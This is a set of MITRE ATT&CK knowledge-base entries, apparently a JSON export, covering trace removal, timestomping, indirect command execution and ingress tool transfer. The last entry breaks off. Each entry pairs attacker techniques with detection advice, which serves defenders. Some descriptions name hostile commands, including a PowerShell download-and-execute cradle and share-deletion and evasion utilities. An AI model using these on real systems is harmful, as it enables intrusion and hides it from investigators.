{"ID":"T1070.005","name":"Indicator Removal: Network Share Connection Removal","description":"Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use)","url":"https://attack.mitre.org/techniques/T1070/005","created":"31 January 2020","last modified":"13 April 2023","version":"1.1","tactics":"Defense Evasion","detection":"Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.","platforms":"Windows","data sources":"Command: Command Execution, Network Traffic: Network Traffic Content, Process: Process Creation, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":"Host forensic analysis","contributors":null,"permissions required":null,"supports remote":null,"system requirements":"Established network share connection to a remote system. Level of access depends on permissions of the account used.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Technet Net Use),(Citation: CarbonBlack RobbinHood May 2019),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ESET InvisiMole June 2018),"}
{"ID":"T1070.006","name":"Indicator Removal: Timestomp","description":"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)","url":"https://attack.mitre.org/techniques/T1070/006","created":"31 January 2020","last modified":"29 March 2020","version":"1.0","tactics":"Defense Evasion","detection":"Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata, File: File Modification","is sub-technique":true,"sub-technique of":"T1070","defenses bypassed":"Host forensic analysis","contributors":"Romain Dumont, ESET","permissions required":"root, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: Novetta Winnti April 2015),(Citation: NCC Group Chimera January 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Novetta Blockbuster Loaders),(Citation: Novetta-Axiom),(Citation: McAfee Bankshot),(Citation: ESET InvisiMole June 2018),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: FireEye APT32 May 2017),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Prevailion EvilNum May 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: Fidelis Turbo),(Citation: ESET OceanLotus macOS April 2019),(Citation: PWC KeyBoys Feb 2017),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Dell TG-3390),(Citation: NCSC Cyclops Blink February 2022),(Citation: FireEye TRITON 2019),(Citation: Novetta Blockbuster),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Github PowerShell Empire),(Citation: NHS UK BLINDINGCAN Aug 2020),(Citation: Crowdstrike DNC June 2016),(Citation: NCSC Joint Report Public Tools),(Citation: ESET Attor Oct 2019),(Citation: Anomali Rocke March 2019),(Citation: McAfee Shamoon December 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET Gelsemium June 2021),(Citation: ESET Gazer Aug 2017),(Citation: Unit 42 PingPull Jun 2022),(Citation: Scarlet Mimic Jan 2016),(Citation: ESET DazzleSpy Jan 2022),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: cobaltstrike manual),(Citation: CrowdStrike Putter Panda),(Citation: Cybereason Kimsuky November 2020),(Citation: Cylance Dust Storm),(Citation: FireEye POSHSPY April 2017),(Citation: FireEye Periscope March 2018),(Citation: Lee 2013),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: ESET Kobalos Jan 2021),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: 20 macOS Common Tools and Techniques),(Citation: Crowdstrike Indrik November 2018),(Citation: McAfee GhostSecret),(Citation: Lotus Blossom Jun 2015),"}
{"ID":"T1202","name":"Indirect Command Execution","description":"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.","url":"https://attack.mitre.org/techniques/T1202","created":"18 April 2018","last modified":"05 May 2022","version":"1.1","tactics":"Defense Evasion","detection":"Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections. (Citation: RSA Forfiles Aug 2017)","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Application Control, Static File Analysis","contributors":"Matthew Demaske, Adaptforward","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: VectorSec ForFiles Aug 2017),(Citation: Qualys LolZarus),(Citation: Evi1cg Forfiles Nov 2017),(Citation: Cofense RevengeRAT Feb 2019),"}
{"ID":"T1105","name":"Ingress Tool Transfer","description":"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)","url":"https://attack.mitre.org/techniques/T1105","created":"31 May 2017","last modified":"14 April 2023","version":"2.2","tactics":"Command and Control","detection":"Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"John Page (aka hyp3rlinx), ApparitionSec; Mark Wee","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant APT1),(Citation: Proofpoint Azorult July 2018),(Citation: FireEye APT33 Sept 2017),(Citation: Group IB Silence Sept 2018),(Citation: Costa AvosLocker May 2022),(Citation: ESET InvisiMole June 2018),(Citation: NCCGroup RokRat Nov 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: Flashpoint FIN 7 March 2019),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Unit42 Emissary Panda May 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: CoinTicker 2019),(Citation: sentinelone shlayer to zshlayer),(Citation: Leonardo Turla Penquin May 2020),(Citation: Sophos Netwalker May 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Symantec Calisto July 2018),(Citation: Microsoft PLATINUM June 2017),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Talos NavRAT May 2018),(Citation: Zscaler Bazar September 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Mandiant APT1 Appendix),(Citation: JPCERT ChChes Feb 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Securelist APT10 March 2021),(Citation: ESET PipeMon May 2020),(Citation: Google TAG Lazarus Jan 2021),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Check Point APT34 April 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit 42 WhisperGate January 2022),(Citation: CISA SoreFang July 2016),(Citation: FireEye FIN7 April 2017),(Citation: Unit 42 TA551 Jan 2021),(Citation: CIRCL PlugX March 2013),(Citation: Symantec Remsec IOCs),(Citation: TrendMicro PE_URSNIF.A2),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: FireEye admin@338),(Citation: jRAT Symantec Aug 2018),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: PWC WellMess July 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Unit 42 Valak July 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Symantec Volgmer Aug 2014),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Symantec Wiarp May 2012),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Cybereason Chaes Nov 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Symantec Ristol May 2012),(Citation: FireEye Fin8 May 2016),(Citation: Forcepoint Felismus Mar 2017),(Citation: Talos ZxShell Oct 2014),(Citation: CheckPoint Bandook Nov 2020),(Citation: Securelist ShadowPad Aug 2017),(Citation: ESET Attor Oct 2019),(Citation: Microsoft FTP),(Citation: ESET Zebrocy May 2019),(Citation: Medium S2W WhisperGate January 2022),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: McAfee Sodinokibi October 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: CISA WellMail July 2020),(Citation: Microsoft DUBNIUM June 2016),(Citation: Trend Micro Qakbot December 2020),(Citation: Fidelis INOCNATION),(Citation: Unit 42 Playbook Dec 2017),(Citation: Picus Sodinokibi January 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: Reaqta MuddyWater November 2017),(Citation: Cybereason Bazar July 2020),(Citation: HP SVCReady Jun 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: BiZone Lizar May 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Microsoft WhisperGate January 2022),(Citation: Mandiant APT41),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Cybereason TA505 April 2019),(Citation: Gigamon Berserk Bear October 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: FireEye POSHSPY April 2017),(Citation: 20 macOS Common Tools and Techniques),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: FireEye FiveHands April 2021),(Citation: BlackBerry Amadey 2020),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: ESET Grandoreiro April 2020),(Citation: wardle evilquest partii),(Citation: Fidelis njRAT June 2013),(Citation: NCSC Cyclops Blink February 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: Talos Seduploader Oct 2017),(Citation: Morphisec ShellTea June 2019),(Citation: PaloAlto NanoCore Feb 2016),(Citation: ANSSI Sandworm January 2021),(Citation: FireEye FIN7 March 2017),(Citation: Juniper IcedID June 2020),(Citation: McAfee Night Dragon),(Citation: Microsoft Actinium February 2022),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: US-CERT Bankshot Dec 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: Talos Bisonal Mar 2020),(Citation: Symantec Dyre June 2015),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: Cybereason PowerLess February 2022),(Citation: NCSC APT29 July 2020),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: RATANKBA),(Citation: Proofpoint TA505 October 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Forcepoint Monsoon),(Citation: FireEye NETWIRE March 2019),(Citation: Mandiant No Easy Breach),(Citation: Unit42 BendyBear Feb 2021),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Symantec Backdoor.Nidiran),(Citation: FireEye APT41 March 2020),(Citation: Linux FTP),(Citation: Symantec Elfin Mar 2019),(Citation: DOJ FIN7 Aug 2018),(Citation: Unit42 Molerat Mar 2020),(Citation: Symantec Shuckworm January 2022),(Citation: Symantec Chafer February 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Intezer TeamTNT September 2020),(Citation: TrendMicro TropicTrooper 2015),(Citation: Qualys LolZarus),(Citation: Lee 2013),(Citation: Unit42 Xbash Sept 2018),(Citation: Volexity PowerDuke November 2016),(Citation: Malwarebytes Konni Aug 2021),(Citation: Volexity OceanLotus Nov 2017),(Citation: Accenture Dragonfish Jan 2018),(Citation: ESET Sednit Part 3),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Dell Sakula),(Citation: ESET GreyEnergy Oct 2018),(Citation: Novetta Blockbuster Loaders),(Citation: Lazarus RATANKBA),(Citation: TrendMicro Taidoor),(Citation: Symantec Darkmoon Aug 2005),(Citation: FireEye Clandestine Fox),(Citation: ESET Industroyer),(Citation: Dell TG-3390),(Citation: Kaspersky Lyceum October 2021),(Citation: Microsoft Unidentified Dec 2018),(Citation: Kaspersky StoneDrill 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: ESET Gazer Aug 2017),(Citation: GDATA Zeus Panda June 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Securelist ScarCruft May 2019),(Citation: Microsoft Holmium June 2020),(Citation: FireEye Periscope March 2018),(Citation: SentinelLabs Metador Sept 2022),(Citation: Aquino RARSTONE),(Citation: US-CERT Volgmer Nov 2017),(Citation: Cisco Talos Avos Jun 2022),(Citation: ThreatExpert Agent.btz),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Lotus Blossom Dec 2015),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Talos Micropsia June 2017),(Citation: Palo Alto Sofacy 06-2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Kaspersky QakBot September 2021),(Citation: US-CERT TA18-074A),(Citation: IBM IcedID November 2017),(Citation: Kaspersky MoleRATs April 2019),(Citation: Symantec Vasport May 2012),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Talos Lokibot Jan 2021),(Citation: ESET Exchange Mar 2021),(Citation: Group IB Ransomware September 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: FireEye APT29 Nov 2018),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Securelist Dropping Elephant),(Citation: Check Point Meteor Aug 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: GitHub Sliver Upload),(Citation: Trusteer Carberp October 2010),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Talos Konni May 2017),(Citation: Aqua Kinsing April 2020),(Citation: Riskiq Remcos Jan 2018),(Citation: Korean FSI TA505 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Symantec Briba May 2012),(Citation: Talos Agent Tesla Oct 2018),(Citation: Unit 42 KerrDown February 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Bisonal July 2018),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Crowdstrike DNC June 2016),(Citation: NCSC Joint Report Public Tools),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Lunghi Iron Tiger Linux),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Profero APT27 December 2020),(Citation: TechNet Copy),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: Symantec WastedLocker June 2020),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: Zscaler Kasidet),(Citation: Talos Sodinokibi April 2019),(Citation: ClearSky Wilted Tulip July 2017),(Citation: TrendMicro DarkComet Sept 2014),(Citation: ClearSky Siamesekitten August 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Secureworks Karagany July 2019),(Citation: Talos Cobalt Group July 2018),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Cybereason Valak May 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Unit 42 Gamaredon February 2022),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Rancor Unit42 June 2018),(Citation: Microsoft POLONIUM June 2022),(Citation: ESET Sednit Part 1),(Citation: Cybereason Egregor Nov 2020),(Citation: CISA AA20-301A Kimsuky),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Kaspersky Adwind Feb 2016),(Citation: Cisco H1N1 Part 2),(Citation: Google EXOTIC LILY March 2022),(Citation: Unit 42 Sofacy Feb 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Proofpoint NETWIRE December 2020),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Trend Micro IXESHE 2012),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Lazarus APT January 2022),(Citation: Cylance Shaheen Nov 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: ESET Gelsemium June 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: Talos TinyTurla September 2021),(Citation: FireEye APT28),(Citation: Kaspersky Winnti April 2013),(Citation: Cybereason Soft Cell June 2019),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Unit 42 RGDoor Jan 2018),(Citation: FireEye APT10 April 2017),(Citation: NSA/FBI Drovorub August 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: PWC Cloud Hopper April 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: CheckPoint Naikon May 2020),(Citation: ESET LoudMiner June 2019),(Citation: Palo Alto OilRig Sep 2018),(Citation: Intezer Doki July 20),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: McAfee Cuba April 2021),(Citation: ESET Telebots Dec 2016),(Citation: Securelist Octopus Oct 2018),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Check Point Warzone Feb 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: ESET ForSSHe December 2018),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Cofense Astaroth Sept 2018),(Citation: Prevx Carberp March 2011),(Citation: Accenture MUDCARP March 2019),(Citation: FireEye FELIXROOT July 2018),(Citation: Cylance Dust Storm),(Citation: Unit42 BabyShark Apr 2019),(Citation: Securelist Dtrack),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: IBM Grandoreiro April 2020),(Citation: Novetta Winnti April 2015),(Citation: Symantec Frutas Feb 2013),(Citation: Intrinsec Egregor Nov 2020),(Citation: LOLBAS Certutil),(Citation: BlackBerry Bahamut),(Citation: Trend Micro Daserf Nov 2017),(Citation: Malwarebytes Pony April 2016),(Citation: CISA WellMess July 2020),(Citation: Microsoft HAFNIUM March 2020),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Carbon Black HotCroissant April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: ESET RTM Feb 2017),(Citation: F-Secure The Dukes),(Citation: MSTIC FoggyWeb September 2021),(Citation: GitHub QuasarRAT),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Unit42 Azorult Nov 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Cyble Sidewinder September 2020),(Citation: SANS Conficker),(Citation: GitHub Pupy),(Citation: Trend Micro DRBControl February 2020),(Citation: CyberBit Dtrack),(Citation: TrendMicro macOS Dacls May 2020),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Securelist WhiteBear Aug 2017),(Citation: FoxIT Wocao December 2019),(Citation: Kaspersky WIRTE November 2021),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: SecureWorks August 2019),(Citation: ESET Okrum July 2019),(Citation: McAfee Lazarus Jul 2020),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Github PowerShell Empire),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Github Koadic),(Citation: FireEye APT37 Feb 2018),(Citation: Bitdefender StrongPity June 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Group IB GrimAgent July 2021),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: NCC Group Team9 June 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: Talos ROKRAT),(Citation: McAfee Gold Dragon),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: TrendMicro BlackTech June 2017),(Citation: Threatpost Hancitor),(Citation: McAfee Honeybee),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Palo Alto DNS Requests),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Bitdefender Naikon April 2021),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Check Point Rocket Kitten),(Citation: Symantec Bumblebee June 2022),(Citation: ESET Turla Mosquito May 2018),(Citation: Unit 42 OilRig Sept 2018),(Citation: Symantec Pasam May 2012),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Medium Anchor DNS July 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: ESET Dukes October 2019),(Citation: Unit 42 Nokki Oct 2018),(Citation: Talos PoetRAT October 2020),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Securelist MiniDuke Feb 2013),(Citation: Fortinet Diavol July 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Volexity Patchwork June 2018),(Citation: Palo Alto menuPass Feb 2017),(Citation: LOLBAS Esentutl),(Citation: Uptycs Confucius APT Jan 2021),(Citation: ESET TeleBots Oct 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Radware Micropsia July 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Recorded Future REDDELTA July 2020),(Citation: Talos Rocke August 2018),(Citation: Nccgroup Gh0st April 2018),(Citation: Prevailion EvilNum May 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Security Affairs DustSquad Oct 2018),(Citation: Symantec Security Center Trojan.Kwampirs),(Citation: Trend Micro Waterbear December 2019),(Citation: Novetta Blockbuster),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Bitdefender LuminousMoth July 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: TechNet Certutil),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Secureworks MCMD July 2019),(Citation: Symantec Whitefly March 2019),(Citation: Trend Micro Totbrick Oct 2016),(Citation: DFIR Phosphorus November 2021),(Citation: ESET EvilNum July 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Symantec Backdoor.Mivast),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Unit42 RDAT July 2020),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Lab52 WIRTE Apr 2019),(Citation: PaloAlto DNS Requests May 2016),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Donut Github),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Medium Metamorfo Apr 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: Microsoft BITSAdmin),(Citation: Symantec Buckeye),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET InvisiMole June 2020),(Citation: Trend Micro Skidmap),(Citation: Novetta-Axiom),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Symantec Linfo May 2012),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: Unit42 Redaman January 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Microsoft GALLIUM December 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ClearSky Lazarus Aug 2020),(Citation: Accenture Lyceum Targets November 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Gh0stRAT ATT March 2019),(Citation: Objective-See MacMa Nov 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Intezer HiddenWasp Map 2019),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: FireEye APT10 Sept 2018),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Talos PoetRAT April 2020),(Citation: Cyberint Qakbot May 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Trend Micro njRAT 2018),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: TrendMicro MacOS April 2018),(Citation: Cycraft Chimera April 2020),(Citation: Trend Micro Ransomware February 2021),(Citation: University of Birmingham C2)"}
{"ID":"T1490","name":"Inhibit System Recovery","description":"Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery 